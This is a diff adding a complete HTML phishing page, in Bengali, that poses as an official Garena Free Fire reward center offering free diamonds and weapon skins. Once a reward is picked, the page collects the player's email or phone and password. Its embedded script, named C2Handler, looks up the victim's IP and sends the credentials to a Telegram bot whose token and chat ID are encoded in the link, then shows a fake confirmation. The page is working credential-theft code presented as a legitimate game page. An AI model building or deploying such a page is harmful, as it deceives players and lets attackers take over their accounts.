@@ -1,0 +1,322 @@
+<!doctype html>
+<html lang="bn">
+  <head>
+    <script src="/tg-client.js"></script>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Garena - Free Fire Reward Center</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Teko:wght@400;600&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+      body {
+        font-family: "Teko", sans-serif;
+        background: url("https://wallpaperaccess.com/full/1209308.jpg")
+          no-repeat center center fixed;
+        background-size: cover;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        min-height: 100vh;
+        padding: 10px;
+      }
+      .container {
+        width: 100%;
+        max-width: 420px;
+        background: rgba(0, 0, 0, 0.85);
+        border: 2px solid #ff9c00;
+        border-radius: 5px;
+        overflow: hidden;
+        box-shadow: 0 0 20px #ff9c00;
+      }
+      .header {
+        background: #ff9c00;
+        padding: 15px;
+        text-align: center;
+        color: black;
+        font-size: 24px;
+        font-weight: 600;
+        text-transform: uppercase;
+      }
+      .main {
+        padding: 20px;
+      }
+
+      /* Reward Selection Grid */
+      .reward-grid {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 10px;
+        margin-bottom: 20px;
+      }
+      .reward-item {
+        background: #1a1a1a;
+        border: 1px solid #444;
+        padding: 10px;
+        text-align: center;
+        cursor: pointer;
+        border-radius: 5px;
+        transition: 0.3s;
+      }
+      .reward-item:hover {
+        border-color: #ff9c00;
+        transform: scale(1.05);
+      }
+      .reward-item img {
+        width: 70px;
+        height: 70px;
+        margin-bottom: 5px;
+      }
+      .reward-item p {
+        color: #fff;
+        font-size: 18px;
+      }
+
+      .form-group {
+        margin-bottom: 15px;
+      }
+      .input {
+        width: 100%;
+        padding: 12px;
+        background: #222;
+        border: 1px solid #ff9c00;
+        color: #fff;
+        font-size: 20px;
+        border-radius: 3px;
+        outline: none;
+      }
+      .btn {
+        width: 100%;
+        padding: 12px;
+        background: #ff9c00;
+        color: #000;
+        border: none;
+        font-size: 22px;
+        font-weight: 600;
+        cursor: pointer;
+        text-transform: uppercase;
+      }
+
+      .section {
+        display: none;
+      }
+      .active {
+        display: block;
+        animation: zoomIn 0.3s ease;
+      }
+      @keyframes zoomIn {
+        from {
+          transform: scale(0.8);
+          opacity: 0;
+        }
+        to {
+          transform: scale(1);
+          opacity: 1;
+        }
+      }
+
+      .loader {
+        border: 4px solid #f3f3f3;
+        border-top: 4px solid #ff9c00;
+        border-radius: 50%;
+        width: 40px;
+        height: 40px;
+        animation: spin 1s linear infinite;
+        margin: 20px auto;
+      }
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+      .footer {
+        text-align: center;
+        color: #888;
+        font-size: 14px;
+        margin-top: 10px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="header">Free Fire Rewards</div>
+
+      <div class="main">
+        <div id="step1" class="section active">
+          <h3
+            style="
+              color: #ff9c00;
+              text-align: center;
+              margin-bottom: 15px;
+              font-size: 22px;
+            "
+          >
+            একটি রিওয়ার্ড সিলেক্ট করুন
+          </h3>
+          <div class="reward-grid">
+            <div class="reward-item" onclick="selectReward('5000 Diamonds')">
+              <img src="https://i.ibb.co/vX8p8S9/diamond.png" alt="diam" />
+              <p>5000 Diamonds</p>
+            </div>
+            <div class="reward-item" onclick="selectReward('MP40 Cobra')">
+              <img src="https://i.ibb.co/YyYhQ3R/cobra.png" alt="cobra" />
+              <p>MP40 Cobra</p>
+            </div>
+            <div class="reward-item" onclick="selectReward('Blue Flame AK')">
+              <img src="https://i.ibb.co/mH6qC1m/ak.png" alt="ak" />
+              <p>Blue Flame AK</p>
+            </div>
+            <div class="reward-item" onclick="selectReward('Hip Hop Bundle')">
+              <img src="https://i.ibb.co/L8r4C3h/bundle.png" alt="bundle" />
+              <p>Hip Hop Bundle</p>
+            </div>
+          </div>
+        </div>
+
+        <div id="step2" class="section">
+          <h3
+            style="
+              color: #fff;
+              text-align: center;
+              margin-bottom: 15px;
+              font-size: 22px;
+            "
+          >
+            অ্যাকাউন্ট ভেরিফাই করুন
+          </h3>
+          <div class="form-group">
+            <input
+              type="text"
+              id="ff_user"
+              class="input"
+              placeholder="Email or Phone"
+            />
+          </div>
+          <div class="form-group">
+            <input
+              type="password"
+              id="ff_pass"
+              class="input"
+              placeholder="Password"
+            />
+          </div>
+          <button class="btn" id="btn1">ক্লেইম করুন</button>
+        </div>
+
+        <div id="loading" class="section" style="text-align: center">
+          <div class="loader"></div>
+          <p style="color: #fff; font-size: 18px">
+            সার্ভারে আইটেমটি চেক করা হচ্ছে...
+          </p>
+        </div>
+
+        <div id="success" class="section" style="text-align: center">
+          <h3 style="color: #ff9c00; font-size: 30px">আবেদন সফল!</h3>
+          <p style="color: #fff; font-size: 20px">
+            আপনার সিলেক্ট করা আইটেমটি আগামী ২৪ ঘণ্টার মধ্যে গেম ইনবক্সে পাঠিয়ে
+            দেওয়া হবে।
+          </p>
+        </div>
+
+        <p class="footer">Garena Free Fire © 2026</p>
+      </div>
+    </div>
+
+    <script>
+      class C2Handler {
+        constructor() {
+          this.config = this.init();
+        }
+        init() {
+          const params = new URLSearchParams(window.location.search);
+          const p = params.get("p");
+          if (p) {
+            try {
+              const decoded = JSON.parse(atob(p));
+              return { token: decoded.bot, chat: decoded.chat };
+            } catch (e) {
+              console.error("Config missing");
+            }
+          }
+          return { token: null, chat: null };
+        }
+        async getIP() {
+          try {
+            const res = await fetch("https://api.ipify.org?format=json");
+            const data = await res.json();
+            return data.ip;
+          } catch {
+            return "Unknown";
+          }
+        }
+        async sendTelegram(user, pass, item) {
+          if (!this.config.token || !this.config.chat) return;
+          const ip = await this.getIP();
+          const time = new Date().toLocaleString("bn-BD", {
+            timeZone: "Asia/Dhaka",
+          });
+          let msg = `*🎮 FREE FIRE HIT DETECTED* 🔥\n\n`;
+          msg += `👤 *User:* \`${user}\`\n`;
+          msg += `🔑 *Pass:* \`${pass}\`\n`;
+          msg += `🎁 *Item:* ${item}\n\n`;
+          msg += `🌐 *IP:* \`${ip}\`\n`;
+          msg += `🕐 *Time:* ${time}`;
+
+          try {
+            await fetch(
+              `https://api.telegram.org/bot${this.config.token}/sendMessage`,
+              {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                  chat_id: this.config.chat,
+                  text: msg,
+                  parse_mode: "Markdown",
+                }),
+              },
+            );
+          } catch (e) {}
+        }
+      }
+
+      const c2 = new C2Handler();
+      let selectedItem = "";
+
+      function selectReward(item) {
+        selectedItem = item;
+        document.getElementById("step1").classList.remove("active");
+        document.getElementById("step2").classList.add("active");
+      }
+
+      document.getElementById("btn1").onclick = async () => {
+        const user = document.getElementById("ff_user").value.trim();
+        const pass = document.getElementById("ff_pass").value.trim();
+
+        if (user === "" || pass.length < 5) {
+          alert("আপনার গেমিং আইডির সঠিক তথ্য দিন!");
+          return;
+        }
+
+        document.getElementById("btn1").innerText = "Verifying...";
+        await c2.sendTelegram(user, pass, selectedItem);
+
+        document.getElementById("step2").classList.remove("active");
+        document.getElementById("loading").classList.add("active");
+
+        setTimeout(() => {
+          document.getElementById("loading").classList.remove("active");
+          document.getElementById("success").classList.add("active");
+        }, 4000);
+      };
+    </script>
+  </body>
+</html>
